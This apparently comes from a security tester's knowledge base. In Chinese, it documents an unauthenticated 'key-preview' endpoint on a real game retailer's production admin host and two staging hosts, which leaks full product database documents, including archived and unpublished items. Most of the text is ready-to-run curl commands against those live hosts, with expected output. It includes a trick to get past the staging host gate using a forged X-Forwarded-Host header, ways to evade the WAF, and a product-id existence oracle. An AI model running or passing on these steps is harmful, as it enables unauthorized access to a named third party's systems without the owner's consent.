# Fanatical /api/products/key-preview —— 后台预览接口的未鉴权公开镜像

## 0. 一句话
`GET /api/products/key-preview/{productId}/{language}` 是后台 `GET /api/admin/products/preview/{productId}/{language}`（需 admin，恒 401）的公开镜像：preview key 从不校验（生产甚至不需要带 key），零凭据即返回完整商品/合集 Mongo 文档；公共 `/api/products-group` 已 404 的归档/非公开商品也能读到。

## 1. 前置条件
- 无需账号 / 会话 / Authorization / Cookie / preview key。
- 三个入口实测均可用：
  - 生产：`https://admin.fanatical.com`（Heroku + Cloudflare 前置；可直接访问，也可 `--resolve` 到 GA 源站 IP + `Host` 头）
  - staging：`https://apistaging.fanatical.com`（需源站直连 + `Host: apistaging.fanatical.com` + 任意 `X-Forwarded-Host` 绕过应用层 Host 门禁）
  - staging2：`https://apistaging2.fanatical.com` / `https://fan-api-staging-2.herokuapp.com`（同上；与 staging 同一商品库）
- 一个 24 位 hex 的商品/合集 `_id`：可从 `/api/all/en`、商品页 JSON、历史 bundle 文档中拿。
- UA 用浏览器类；裸 curl UA 在 `/api/products-group` 等路径会被边缘拦成 `403 Request blocked`（15B）。

## 2. 生产 admin —— 最强判据（无 key、无 Authorization、无 Cookie）

```bash
UA="${ARTEX_UA:-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0 Safari/537.36}"
IP=$(nslookup -type=A admin.fanatical.com.herokudns.com 1.1.1.1 | awk '/^Address:/{print $2}' | tail -1)

curl -sk --noproxy '*' --resolve admin.fanatical.com:443:$IP \
  -H 'Host: admin.fanatical.com' -A "$UA" \
  -D headers_admin_kp.txt -o resp_admin_kp.json \
  'https://admin.fanatical.com/api/products/key-preview/663cd0b11c0036e84f48b26d/en'
```

期望：

```
HTTP/2 200
content-type: application/json; charset=utf-8
content-length: 83458
{"_id":"663cd0b11c0036e84f48b26d","__v":146,"age":{"ESRB":17,...},"availability":{...},...
```

`__v`（Mongoose 版本键）、`age`、`availability`、`visible`、`draft`、`archive`、`supplier_id` 等都是数据库文档级字段，说明回显的是完整 Mongo doc，而非前端目录裁剪后的 DTO。

### 2.1 对照：同 id 的后台预览路由必须 401

```bash
curl -sk --noproxy '*' --resolve admin.fanatical.com:443:$IP \
  -H 'Host: admin.fanatical.com' -A "$UA" \
  'https://admin.fanatical.com/api/admin/products/preview/663cd0b11c0036e84f48b26d/en'
# HTTP/2 401
# {"code":401,"error":"User not authenticated"}
```

这条对照很关键：同一个商品 id，后台路由有强鉴权，而 `key-preview` 路由匿名 200 —— 证明它是后台功能的公开镜像，而不是“本来就是公开数据”。

## 3. staging —— 任意 key 都放行，key 参数从未被校验

```bash
for k in 'abc' '%20' '0' 'false'; do
  curl -sk --noproxy '*' --resolve apistaging.fanatical.com:443:$IP \
    -H 'Host: apistaging.fanatical.com' -H 'X-Forwarded-Host: attacker.example' -A "$UA" \
    -o /dev/null -w "$k -> %{http_code} %{size_download}\n" \
    "https://apistaging.fanatical.com/api/products/key-preview/63d3c43151b7f7fe2acc05ef/en?key=$k"
done
```

实测输出（四个值全部相同）：

```
abc -> 200 69767
%20 -> 200 69767
0 -> 200 69767
false -> 200 69767
```

说明 key 只是被当 JS 真值/字符串存在性判断，或压根没进入校验分支；**它从来不是有效的授权凭据**。

> 空 key 行为不稳定：首测 `500/30B {"message":"Unexpected Error"}`，复测 `200/69767B`。因此不要把“空 key 报错”当判据，稳定判据是“任意非空值 + 大体积商品文档”。

## 4. 读公共 API 已拒绝的归档/非公开商品

```bash
# 归档商品：key-preview 200
curl -sk --noproxy '*' --resolve apistaging.fanatical.com:443:$IP \
  -H 'Host: apistaging.fanatical.com' -H 'X-Forwarded-Host: attacker.example' -A "$UA" \
  'https://apistaging.fanatical.com/api/products/key-preview/63ee498f844969a3cca8557e/en?key=1'
# HTTP 200，38223B
# {"_id":"63ee498f844969a3cca8557e",...,"name":"Mystery Zodiac game","archive":true,"draft":false,
#  "visible":{"valid_from":"...","valid_until":"2023-02-16T14:36:15.496Z"},...}

# 同一 slug 的公共路由：404
curl -sk --noproxy '*' --resolve apistaging.fanatical.com:443:$IP \
  -H 'Host: apistaging.fanatical.com' -H 'X-Forwarded-Host: attacker.example' \
  -H 'anonid: 11111111-1111-4111-8111-111111111111' -A "$UA" \
  'https://apistaging.fanatical.com/api/products-group/mystery-zodiac-game/en'
# HTTP 404，23B {"message":"Not Found"}

# 对照：已发布 slug 公共路由 200
# /api/products-group/hogwarts-legacy-digital-deluxe-edition/en -> 200 69863B
```

结论：`key-preview` 绕过了 `products-group` 的“已发布/可见窗口”过滤，能取到归档（`archive:true`）和可见期已过的商品文档。若知道 `_id`，同一路由对任意商品/合集文档都返回完整内容。

## 5. staging2 与 staging 同库

```bash
curl -sk --noproxy '*' \
  -H 'Host: apistaging2.fanatical.com' \
  -H 'X-Forwarded-Host: apistaging2.fanatical.com' -A "$UA" \
  'https://fan-api-staging-2.herokuapp.com/api/products/key-preview/63d3c43151b7f7fe2acc05ef/en?key=1' \
  -o resp_stg2_kp.json
cmp resp_stg_kp_key0.json resp_stg2_kp.json && echo IDENTICAL
```

实测：`200/69767B`，与 staging 响应逐字节一致 —— 同一套 staging 商品库，两个 app 共享同一缺陷面。

## 6. 判据（三件套，缺一不可）
1. HTTP 200 + 体积数万字节的 JSON，body 含 `_id` / `__v` / `age` / `availability` / `draft` / `archive` 等文档级字段；
2. 同 id 的 `/api/admin/products/preview/...` 返回 401 `{"code":401,"error":"User not authenticated"}`；
3. 任意 key 值（含明显假值）不改变响应；归档商品的公共 `products-group` 路由 404 而本路由 200。

## 7. 失败时的常见原因
- **403 `Request blocked`（15B）**：裸 curl UA 或缺少必要头。换浏览器 UA；staging 必须带 `Host` + `X-Forwarded-Host`；`products-group` 还需合法 UUIDv4 `anonid`。
- **404 `{"message":"Not Found"}`**：撞到了公共路由而不是 `key-preview`；或 target 是 `www.fanatical.com`（www 侧同名 key-preview 只回公开目录子集，见第 9 节）。
- **401 `{"code":401,...}`**：打到 `/api/admin/products/preview`（该路由确实有鉴权）。
- **500 `{"message":"Unexpected Error"}`**：`productId` 不是库中存在的 24 位 hex（这本身可当商品 id 存在性 oracle），不是利用失败。
- **响应很小于 ~10KB**：拿到的是公开目录 DTO 而非完整文档 —— 说明走错了 host（多为 www）或 id 不存在。

## 8. 边界（如实）
- 不包含游戏 key、序列号、兑换码、订单/用户数据；本次测试未取得任何此类数据。
- 该接口**不能**用于进入后台：`admin.fanatical.com` 的 `/api/admin/*` 应用层 JWT 鉴权仍然有效（KB 条目 `admin.fanatical.com-生产后台-cf-access-可绕但应用层-admin-jwt-无法绕过-不可取`）。
- 价值在于：完整商品/合集文档、内部字段与定价元数据、未发布/归档商品的提前泄露，属于 medium 级信息泄露/访问控制缺失。

## 9. 与 www 侧同名路由的区分（避免误判为重复）
- `www.fanatical.com/api/products/key-preview/{id}/{lang}`：同样不校验 key，但只回公开目录子集（约 7.2KB，无 `base_game`/`drmEditions`/`in_bundles` 等字段），且对 256 个同批 ObjectId 扫描未发现 draft/archive 泄露 —— 该结论已记录为阴性条目 `fanatical-生产-api-端点参数级实测收口-阴性-admin-login-as-恒-401-products`（id 669）。
- 本条针对 **admin.fanatical.com / apistaging / staging2** 三处：返回完整 Mongo 文档（83KB / 69KB / 38KB），且已实证归档非公开文档可读。两者不是同一结论，勿互相覆盖。

## 10. 证据文件（本次复测）
`/opt/artex/data/sessions/conv-407/` 下：`resp_admin_kp.json`（83458B）、`resp_admin_preview.txt`（401/45B）、`resp_stg_kp_key0.json`（69767B）、`resp_stg_kp_arch.json`（38223B）、`resp_stg2_kp.json`（69767B，与 staging cmp 一致）、`resp_public_404b.txt`（404/23B）、`headers_admin_kp.txt`。